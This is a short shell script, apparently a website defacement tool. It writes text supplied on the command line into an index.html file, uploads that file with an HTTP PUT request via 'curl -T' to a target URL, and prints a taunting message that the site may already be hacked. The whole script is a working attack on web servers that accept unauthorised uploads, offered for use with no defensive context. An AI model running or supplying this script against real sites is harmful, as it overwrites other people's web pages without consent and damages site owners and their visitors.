echo $1 > index.html
curl -T index.html $2
echo "_Maybe website already hacked.. check at ur browser! 🫠_"
rm index.html
